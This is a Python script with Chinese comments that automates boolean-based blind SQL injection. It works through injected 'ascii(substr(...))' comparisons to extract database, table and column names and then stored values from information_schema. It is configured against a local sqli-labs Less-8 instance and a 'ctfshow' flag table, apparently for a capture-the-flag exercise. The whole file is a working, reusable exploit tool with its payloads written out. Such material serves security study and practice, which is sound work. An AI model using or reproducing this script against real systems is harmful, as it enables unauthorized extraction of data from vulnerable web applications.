import requests
from lxml import etree



'''
得到数据库长度
'''
def GetDBLength(url,strValue,limit):
    baseurl = url
    asciiValue=0
    eqlualurl=' or (select length(schema_name) from information_schema.schemata limit {limit},1) = {asciiValue} %23'
    # baseurlequal=baseurl+eqlualurl
    bigurl=' or (select length(schema_name) from information_schema.schemata limit {limit},1) > {asciiValue} %23'
    # baseurlbig = baseurl+bigurl
    low=0;high=127
    while(low<=high):
        asc=(low+high)//2
        # print(asc,end=', ')
        url =baseurl+eqlualurl.format(limit=limit, asciiValue=asc)
        pageequal = requests.get(url=url).text
        url =baseurl+bigurl.format(limit=limit, asciiValue=asc)
        pagebig = requests.get(url=url).text
        if (strValue in pageequal):
            return asc
        if(strValue in pagebig):
            low=asc+1
        else:
            high=asc-1

'''
爆破database
'''
def boolean_sql_database(url,strValue,strloc,limit):

    baseurl = url
    asciiValue=0
    eqlualurl=' or ((select (ascii(substr(schema_name,{strloc},1))) from information_schema.schemata limit {limit},1) = {asciiValue}) %23'
    # baseurlequal=baseurl+eqlualurl
    bigurl=' or ((select (ascii(substr(schema_name,{strloc},1))) from information_schema.schemata limit {limit},1) > {asciiValue}) %23'
    # baseurlbig = baseurl+bigurl
    low=0;high=127
    while(low<=high):
        asc=(low+high)//2
        # print(asc,end=', ')
        url =baseurl+eqlualurl.format(strloc=strloc, limit=limit, asciiValue=asc)
        pageequal = requests.get(url=url).text
        url =baseurl+bigurl.format(strloc=strloc, limit=limit, asciiValue=asc)
        pagebig = requests.get(url=url).text
        if (strValue in pageequal):
            return chr(asc)
        if(strValue in pagebig):
            low=asc+1
        else:
            high=asc-1

'''
爆破table
'''
def boolean_sql_table(url,strValue,databaseName,strloc,limit):

    baseurl = url
    eqlualurl=" or ((select ascii(substr(table_name,{strloc},1)) from information_schema.tables where table_schema='{databaseName}' limit {limit},1)={asciiValue}) %23"
    # baseurlequal=baseurl+eqlualurl
    bigurl=" or ((select ascii(substr(table_name,{strloc},1)) from information_schema.tables where table_schema='{databaseName}' limit {limit},1)>{asciiValue}) %23"
    # baseurlbig = baseurl+bigurl
    low=0;high=127
    while(low<=high):
        asc=(low+high)//2
        print(asc,end=', ')
        url =baseurl+eqlualurl.format(strloc=strloc, databaseName=databaseName,limit=limit, asciiValue=asc)
        # print(url)
        pageequal = requests.get(url=url).text
        url =baseurl+bigurl.format(strloc=strloc, databaseName=databaseName,limit=limit, asciiValue=asc)
        pagebig = requests.get(url=url).text
        if (strValue in pageequal):
            return chr(asc)
        if(strValue in pagebig):
            low=asc+1
        else:
            high=asc-1

'''
爆破column
'''
def boolean_sql_column(url,strValue,databaseName,tableName,strloc,limit):

    baseurl = url
    eqlualurl=" or ((select ascii(substr(column_name,{strloc},1)) from information_schema.columns where table_schema= '{databaseName}' and table_name= '{tableName}' limit {limit},1) = {asciiValue}) %23"
    # baseurlequal=baseurl+eqlualurl
    bigurl=" or ((select ascii(substr(column_name,{strloc},1)) from information_schema.columns where table_schema= '{databaseName}' and table_name= '{tableName}' limit {limit},1) > {asciiValue}) %23"
    # baseurlbig = baseurl+bigurl
    low=0;high=127
    while(low<=high):
        asc=(low+high)//2
        print(asc,end=', ')
        url =baseurl+eqlualurl.format(strloc=strloc, databaseName=databaseName,tableName=tableName,limit=limit, asciiValue=asc)
        # print(url)
        pageequal = requests.get(url=url).text
        url =baseurl+bigurl.format(strloc=strloc, databaseName=databaseName,tableName=tableName,limit=limit, asciiValue=asc)
        # print(url)
        pagebig = requests.get(url=url).text
        if (strValue in pageequal):
            return chr(asc)
        if(strValue in pagebig):
            low=asc+1
        else:
            high=asc-1


'''
爆破value
'''
def boolean_sql_value(url,strValue,databaseName,tableName,columnName,strloc,limit):

    baseurl = url
    asciiValue=0
    eqlualurl=" or ((select ascii(substr({columnName},{strloc},1)) from {databaseName}.{tableName} limit {limit},1) = {asciiValue}) %23"
    bigurl=" or ((select ascii(substr({columnName},{strloc},1)) from {databaseName}.{tableName} limit {limit},1) > {asciiValue}) %23"
    low=0;high=127
    while(low<=high):
        asc=(low+high)//2
        print(asc,end=', ')
        url =baseurl+eqlualurl.format(strloc=strloc, databaseName=databaseName,tableName=tableName,columnName=columnName,limit=limit, asciiValue=asc)
        pageequal = requests.get(url=url).text
        url =baseurl+bigurl.format(strloc=strloc, databaseName=databaseName,tableName=tableName,columnName=columnName,limit=limit, asciiValue=asc)
        pagebig = requests.get(url=url).text
        if (strValue in pageequal):
            return chr(asc)
        if(strValue in pagebig):
            low=asc+1
        else:
            high=asc-1

class Config(object):
    """配置参数"""
    def __init__(self):
        # 爆破url
        self.url = "http://127.0.0.1:2333/sqli-labs/Less-8/?id=-1'"

        # guessurl
        self.baseurl = "http://127.0.0.1:2333/sqli-labs/Less-8/?id=-1'"
        # 记录的最多数量
        self.numbermax = 20
        # 字符的最大长度
        self.lengthmax = 50
        self.typeList = ['guess', 'database', 'table', 'column', 'value']
        self.type = self.typeList[1]
        # 猜测sql语句的格式
        self.GuessList = ["", "'", '"', ')', "')", '")', "'))", '"))']
        # 成功的特征值
        self.strValue = "are"
        # 数据库名称
        self.databaseName = "ctfshow"
        # 表名称
        self.tableName = "flagjugg"
        # 字段名称
        self.columnName = "flag423"

if __name__ =="__main__":

    config=Config()
    # 爆破url
    url = config.url

    #guessurl
    baseurl=config.baseurl
    #记录的最多数量
    numbermax=config.numbermax
    #字符的最大长度
    lengthmax=config.lengthmax
    typeList =config.typeList
    type = config.type
    #猜测sql语句的格式
    GuessList=config.GuessList
    #成功的特征值
    strValue=config.strValue
    #数据库名称
    databaseName=config.databaseName
    #表名称
    tableName=config.tableName
    #字段名称
    columnName=config.columnName
    if(type=="guess"):
        for guess in GuessList:
            url=baseurl+guess+' and (select (ascii(substr(schema_name,1,1))) from information_schema.schemata limit 0,1) >0 %23'
            response=requests.get(url=url).text
            if(strValue in response):
                url=baseurl+guess
                print(f"guess成功:{guess}")
                print(url)
                exit(0)
            else:
                continue


    #自动操作无需修改
    try:
        for limit in range(0,numbermax):
            result = []
            if (type == 'database'):
                lengthmax = GetDBLength(url, strValue, limit)

            for i in range(1,lengthmax+1):
                if(type=="database"):
                    a=boolean_sql_database(url,strValue,i,limit)
                elif(type=="table"):
                    a=boolean_sql_table(url,strValue,databaseName,i,limit)
                    # a=boolean_sql_column(url,"are","ctftraining","FLAG_TABLE",i,limit)
                elif(type=="column"):
                    a=boolean_sql_column(url,strValue,databaseName,tableName,i,limit)
                elif(type=="value"):
                    a=boolean_sql_value(url,strValue,databaseName,tableName,columnName,i,limit)

                else:
                    print("gkd,重开吧")
                try:
                    if(ord(a)!=0 and a!=None):
                        result.append(a)
                    else:
                        break
                except:
                    break
            if(result==None):
                exit(0)
            print('length :', lengthmax, end=" ")
            print(result,end=' ===> ')
            r=''.join(result)
            if(r==''):
                print('\n\n查询结束')
                break
            else:
                print(r)

    except:
        exit(0)
